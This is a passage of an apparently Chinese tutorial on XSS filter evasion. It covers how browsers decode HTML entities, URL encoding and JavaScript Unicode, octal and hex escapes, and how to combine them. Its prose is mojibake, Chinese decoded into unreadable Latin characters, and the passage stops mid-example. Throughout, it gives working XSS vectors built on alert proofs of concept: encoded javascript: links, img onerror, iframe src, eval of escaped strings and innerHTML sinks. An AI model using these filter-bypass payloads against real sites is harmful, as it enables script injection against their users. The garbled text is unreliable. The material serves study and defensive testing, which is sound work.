â€œæ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ã€â€œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ å’Œ â€œRCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ è¿™ä¸‰ç§çŠ¶æ€ä¸­çš„HTMLå­—ç¬¦å®ä½“å°†ä¼šä» <code>&amp;#â€¦</code> å½¢å¼è§£ç ï¼Œè½¬åŒ–æˆå¯¹åº”çš„è§£ç å­—ç¬¦å¹¶è¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ã€‚</p><p><strong>ï¼ˆ1ï¼‰æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š</strong>æ•°æ®çŠ¶æ€å°±æ˜¯è§£æä¸€ä¸ªæ ‡ç­¾å†…é‡Œé¢çš„å†…å®¹ï¼Œå¦‚ <code>&lt;div&gt;...&lt;/div&gt;</code> ä¸­çš„å†…å®¹ï¼Œå½“æµè§ˆå™¨è§£æå®Œ <code>&lt;div&gt;</code> æ ‡ç­¾ä¹‹åå¦‚æœå‘ç°æ ‡ç­¾å†…è¿˜å«æœ‰å®ä½“å­—ç¬¦çš„è¯ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªå®ä½“ç¼–ç è§£æäº†ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(&quot;xss&quot;)&amp;#62;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾ï¼Œæ­¤æ—¶åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ˜¯ç»è¿‡è½¬ä¹‰çš„å†…å®¹ï¼š</p><p>[<img src="/../images/20210523094712-cb6a83bc-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094712-cb6a83bc-bb68-1.png)</p><p>è¿™çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ ‡ç­¾è¯­è¨€ï¼Œä½†å¹¶ä¸ä¼šè§¦å‘xssï¼Œå› ä¸ºå½“å‰HTMLè§£æå™¨å¤„äºâ€œæ•°æ®çŠ¶æ€â€ï¼Œä¸ä¼šè½¬æ¢åˆ°â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»ºç«‹æ–°çš„æ ‡ç­¾ã€‚å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å­—ç¬¦å®ä½“ç¼–ç è¿™ä¸ªè¡Œä¸ºæ¥è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»è€Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„æ•°æ®åªèƒ½è¢«è§£ææˆâ€œæ•°æ®â€è€Œä¸æ˜¯XSSæ”»å‡»å‘é‡ã€‚</p><p><strong>ï¼ˆ2ï¼‰å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š</strong>å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨å°±å¥½ç†è§£äº†ï¼Œå°±æ˜¯srcï¼Œherfè¿™æ ·çš„å±æ€§å€¼ä¸­çš„HTMLå®ä½“ï¼Œä»–ä¹Ÿæ˜¯ä¼šå…ˆè¿›è¡ŒHTMLè§£ç çš„ï¼Œæ¯”å¦‚ä¸‹é¢çš„è¯­å¥ï¼Œä¼šå…ˆå¯¹é‡Œé¢HTMLè§£ç ï¼Œç„¶åå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š</strong>ç„¶åå†æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯RCDATAè½¬æ€ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š</p><ol><li>ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚ <code>&lt;area&gt;</code>ã€<code>&lt;br&gt;</code>ã€<code>&lt;base&gt;</code> ç­‰ç­‰ã€‚ç©ºå…ƒç´ ä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ã€‚</li><li>åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰ <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code>ã€‚åŸå§‹æ–‡æœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€‚</li><li>RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰ <code>&lt;textarea&gt;</code> å’Œ <code>&lt;title&gt;</code>ã€‚RCDATAå…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚</li><li>å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´ ã€‚å¤–éƒ¨å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚</li><li>åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ ã€‚åŸºæœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚</li></ol><p>æ³¨æ„åˆ°RCDATAå…ƒç´ ä¸­æœ‰ <code>&lt;textarea&gt;</code> å’Œ <code>&lt;title&gt;</code> ä¸¤ä¸ªå±æ€§å¹¶ä¸”æœ‰å­—ç¬¦å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å½“å®ä½“å­—ç¬¦å‡ºç°åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾é‡Œé¢çš„æ—¶å€™ï¼Œå®ä½“å­—ç¬¦ä¼šè¢«è¯†åˆ«å¹¶è¿›è¡ŒHTMLç¼–ç è§£æã€‚è¿™é‡Œè¦å†æé†’ä¸€æ¬¡ï¼Œåœ¨è§£æè¿™äº›å­—ç¬¦å¼•ç”¨çš„è¿‡ç¨‹ä¸­ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»ºç«‹æ–°çš„æ ‡ç­¾ï¼Œæ‰€ä»¥ä¸‹é¢è¿™ä¸ªè¯­å¥è§¦å‘ä¸äº†XSSï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(&quot;xss&quot;)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094713-cbda5a48-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094713-cbda5a48-bb68-1.png)</p><p>ä½†æ˜¯å¦‚æœç›´æ¥æ”¾è¿›å»æ ‡ç­¾çš„å†…å®¹å‘¢ï¼Œä¸å¸¦è½¬ä¹‰å­—ç¬¦å‘¢ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿæ˜¯ä¸ä¼šè§¦å‘XSSçš„ï¼š</p><p><img src="/" alt="img"></p><p>è¿™æ¶‰åŠåˆ°äº†RCDATAçš„ä¸€ä¸ªç‰¹æ®Šçš„æƒ…å†µã€‚å³åœ¨æµè§ˆå™¨è§£æRCDATAå…ƒç´ çš„è¿‡ç¨‹ä¸­ï¼Œè§£æå™¨ä¼šè¿›å…¥â€œRCDATAçŠ¶æ€â€ã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ï¼Œå¦‚æœé‡åˆ°â€œ&lt;â€å­—ç¬¦ï¼Œå®ƒä¼šè½¬æ¢åˆ°â€œRCDATAå°äºå·çŠ¶æ€â€ã€‚å¦‚æœâ€œ&lt;â€å­—ç¬¦åæ²¡æœ‰ç´§è·Ÿç€â€œ&#x2F;â€å’Œå¯¹åº”çš„æ ‡ç­¾åï¼Œè§£æå™¨ä¼šè½¬æ¢å›â€œRCDATAçŠ¶æ€â€ï¼Œå¹¶ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€çš„ã€‚è¿™æ„å‘³ç€åœ¨RCDATAå…ƒç´ æ ‡ç­¾çš„å†…å®¹ä¸­ï¼Œå”¯ä¸€èƒ½å¤Ÿè¢«è§£æå™¨è®¤åšæ˜¯æ ‡ç­¾çš„å°±åªæœ‰ <code>&lt;/textarea&gt;</code> æˆ–è€… <code>&lt;/title&gt;</code>ï¼Œå› æ­¤ï¼Œåœ¨ <code>&lt;textarea&gt;</code> å’Œ <code>&lt;title&gt;</code> çš„å†…å®¹ä¸­ä¸ä¼šåˆ›å»ºæ ‡ç­¾ï¼Œå°±ä¸ä¼šæœ‰è„šæœ¬èƒ½å¤Ÿæ‰§è¡Œäº†ã€‚</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼šæˆ‘ä»¬ä»ä¸Šé¢HTMLçš„äº”ç±»å…ƒç´ ä¸­è¿˜å‘ç°æœ‰ä¸€ä¸ªåŸå§‹æ–‡æœ¬å…ƒç´  <code>&lt;script&gt;</code> åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œé‡Œé¢å†…å®¹ä¸­çš„HTMLç¼–ç å¹¶ä¸ä¼šè¢«è®¤ä¸ºæ˜¯HTMLå®ä½“å¼•ç”¨ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚æµè§ˆå™¨çœ‹ä¸æ‡‚ä¸­é—´è¿™å †ç¼–ç æ˜¯å’Œå•¥ä¸œè¥¿ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094714-cc1f779a-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094714-cc1f779a-bb68-1.png)</p><p>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©é‡Œé¢çš„å†…å®¹è¿›è¡Œè½¬ä¹‰å¹¶æ‰§è¡Œå¼¹çª—å‘¢ï¼Œè¿™é‡Œéœ€è¦åˆ©ç”¨åˆ°XSSçš„ä¸€ä¸ªé»‘é­”æ³•â€”â€”â€œsvgâ€ï¼Œæˆ‘ä»¬ä¸‹æ–‡ä¸­ä¼šæåŠã€‚</p><h2 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h2><p>æˆ‘ä»¬å¯ä»¥å¹¶å°†srcæˆ–hrefå±æ€§ä¸­çš„å†…å®¹è¿›è¡ŒURLç¼–ç ï¼Œå½“HTMLè§£æå™¨å¯¹srcæˆ–hrefä¸­çš„å­—ç¬¦å®ŒæˆHTMLè§£ç åï¼Œæ¥ä¸‹æ¥URLè§£æå™¨ä¼šå¯¹srcæˆ–hrefä¸­çš„å€¼è¿›è¡ŒURLè§£ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;...&quot;&gt;xx&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç»™å‡ºå‡ ä¸ªå®ä¾‹ã€‚</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œä¼ªåè®®å¤´ <code>javascript:</code> æ˜¯ä¸èƒ½è¿›è¡Œç¼–ç çš„ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªURLè§£æè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªç»†èŠ‚äº†ï¼Œå³ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œå¦åˆ™URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´DOMèŠ‚ç‚¹ä¸­è¢«ç¼–ç çš„â€œjavascriptâ€æ²¡æœ‰è¢«è§£ç ï¼Œå½“ç„¶ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«äº†ã€‚å°±æ¯”å¦‚è¯´ <code>http://www.baidu.com</code> å¯ä»¥è¢«URLç¼–ç ä¸º <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>ï¼Œä½†æ˜¯ä¸èƒ½æŠŠåè®®ä¹Ÿè¿›URLç¼–ç ï¼š<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> ã€‚</p><p>ä½†æ˜¯ä¼ªåè®®å¤´ <code>javascript:</code> å¯ä»¥è¿›è¡ŒHTMLç¼–ç ã€‚</p><h2 id="Javascript-ç¼–ç "><a href="#Javascript-ç¼–ç " class="headerlink" title="Javascript ç¼–ç "></a>Javascript ç¼–ç </h2><p>æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸º Javascript ç¼–ç ã€‚å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ <code>&lt;script&gt;</code>ã€<code>&lt;style&gt;</code> è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ <code>src</code>ã€ <code>href</code> åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚</p><p>Javascript ä¸­å¯ä»¥è¯†åˆ«çš„ç¼–ç ç±»å‹æœ‰ï¼š</p><ul><li>Unicode ç¼–ç </li><li>å…«è¿›åˆ¶ç¼–ç </li><li>åå…­è¿›åˆ¶ç¼–ç </li></ul><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨Unicodeç¼–ç çš„æ¯”è¾ƒå¹¿æ³›ï¼Œè€Œå…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶åªæœ‰åœ¨DOMç¯å¢ƒæˆ–eval()ç­‰å‡½æ•°ä¸­æ‰å¯ä»¥ç”¨ã€‚</p><h3 id="Unicode-ç¼–ç "><a href="#Unicode-ç¼–ç " class="headerlink" title="Unicode ç¼–ç "></a>Unicode ç¼–ç </h3><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>ä½†è¦æ³¨æ„ï¼Œæˆ‘ä»¬åŒæ ·ä¹Ÿä¸èƒ½å¯¹ä¼ªåè®®å¤´ <code>javascript:</code> è¿›è¡Œ Javascript ç¼–ç ã€‚å¹¶ä¸”åƒåœ†æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·è¿™æ ·çš„ç¬¦å·æˆ‘ä»¬ä¹Ÿä¸èƒ½è¿› Javascript ç¼–ç ï¼Œä½†æ˜¯èƒ½è¿›è¡ŒHTMLç¼–ç ã€‚</p><h3 id="åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç "><a href="#åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç " class="headerlink" title="åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç "></a>åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç </h3><p>å¯¹äºå…«è¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä¸ Unicode ç¼–ç è¿˜æ˜¯æœ‰åŒºåˆ«ï¼Œåƒä¸‹é¢çš„XSSå‘é‡æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œçš„ï¼š</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\141\154\145\162\164(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\x61\x6c\x65\x72\x74(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾ï¼Œæ’å…¥ä¹‹åæ²¡æœ‰ä»»ä½•ååº”ï¼š</p><p>[<img src="/../images/20210523094714-cc651728-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094714-cc651728-bb68-1.png)</p><p>[<img src="/../images/20210523094714-cca61c3c-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094714-cca61c3c-bb68-1.png)</p><p>è¦æƒ³è®©ä»–ä»¬èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬è¦å°†ä»–ä»¬æ”¾åœ¨DOMç¯å¢ƒä¸­ï¼Œå³DOMå‹çš„XSSã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;...&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæƒ…å†µå¾ˆå¤šéƒ½æ˜¯å‡ºç°åœ¨ä½ æœç´¢åï¼Œæ˜¾ç¤ºä½ æ‰€æŸ¥è¯¢çš„å…³é”®å­—ï¼Œå˜é‡ <code>search</code> æ˜¯ä¸€ä¸ªå¯æ§ç‚¹ï¼Œå½“æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸ªXSSæ”»å‡»å‘é‡åï¼Œå˜é‡ <code>search</code> å°±ä¼šè¢«èµ‹å€¼ä¸ºè¿™ä¸ªXSSå‘é‡ï¼Œä»è€Œæ’å…¥åˆ°divæ ‡ç­¾ä¸­è§¦å‘XSSï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094715-cce8331a-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094715-cce8331a-bb68-1.png)</p><p>æ­¤æ—¶å¦‚æœè¿‡æ»¤äº† <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&#39;</code>ã€<code>&quot;</code>ã€<code>&amp;</code>ã€<code>%</code> ç­‰ç­‰è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨JavaScriptç¼–ç çš„æ–¹æ³•å°†XSSå‘é‡å…¨éƒ¨ç¼–ç ï¼Œå³ <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> çš„ä»¥ä¸‹ç¼–ç éƒ½å¯ä»¥å¼¹çª—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Unicodeç¼–ç </span><br><span class="line">\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E</span><br><span class="line"></span><br><span class="line">// å…«è¿›åˆ¶ç¼–ç </span><br><span class="line">\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76</span><br><span class="line"></span><br><span class="line">// åå…­è¿›åˆ¶ç¼–ç </span><br><span class="line">\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e</span><br></pre></td></tr></table></figure><p><img src="/" alt="img"></p><p>è¿˜æœ‰ä¸€ç§è®©å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶ç¼–ç çš„XSSæ”»å‡»å‘é‡æ‰§è¡Œçš„æ–¹å¼ä¾¿æ˜¯å°†XSSå‘é‡æ”¾åœ¨æŸä¸ªèƒ½æŠŠå­—ç¬¦ä¸²å½“åšJavaScriptä»£ç æ¥æ‰§è¡Œçš„å‡½æ•°é‡Œï¼Œæ¯”å¦‚eval()ã€setTimeout()ã€setInterval()ç­‰å‡½æ•°ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼š</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥å°†ä¸€æ•´æ®µjsä»£ç ç¼–ç åæ”¾å…¥eval()å‡½æ•°ä¸­æ‰§è¡Œã€‚</p><h2 id="æ··åˆç¼–ç "><a href="#æ··åˆç¼–ç " class="headerlink" title="æ··åˆç¼–ç "></a>æ··åˆç¼–ç </h2><p><strong>æ··åˆç¼–ç å°±æ˜¯å¯¹ä¸€ä¸ªXSSå‘é‡åŒæ—¶è¿›è¡Œå¤šç§ç¼–ç ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// å¯¹javascript:è¿›è¡ŒHTMLç¼–ç , å¯¹alert(&quot;xss&quot;)è¿›è¡ŒURLç¼–ç </span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// å¯¹javascript:è¿›è¡ŒHTMLç¼–ç , å¯¹alertè¿›è¡ŒUnicodeç¼–ç </span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>ä¹Ÿå¯ä»¥åˆ©ç”¨è§£ç é¡ºåºè¿›è¡Œæ··åˆç¼–ç ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><p>é¦–å…ˆå¯¹â€œalertâ€è¿›è¡ŒJavaScript Unicodeç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå†å¯¹ <code>\u0061\u006c\u0065\u0072\u0074</code> è¿›è¡ŒURLç¼–ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>æœ€åå¯¹æ ‡ç­¾ä¸­çš„ <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> æ•´ä½“è¿›è¡ŒHTMLç¼–ç å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a 